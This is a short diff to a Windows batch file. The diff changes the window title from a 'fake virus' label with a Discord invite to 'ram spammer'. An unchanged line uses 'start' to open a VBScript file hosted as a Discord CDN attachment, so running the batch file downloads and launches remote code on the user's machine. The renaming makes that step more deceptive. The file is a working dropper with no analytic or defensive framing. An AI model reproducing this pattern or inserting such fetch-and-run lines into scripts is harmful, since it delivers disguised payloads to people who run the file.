@@ -1,6 +1,6 @@
 @echo off
 
-title Fake virus made by Malachi. Join discord.gg/Y3wuBxRBEW
+title ram spammer
 
 start https://cdn.discordapp.com/attachments/1188646022180765766/1190147767813816370/msg.vbs?ex=65a0be7b&is=658e497b&hm=d2c17e71584c60ed7be67185caac06c87632b29985f6342e936026f8e037962f&
 cls
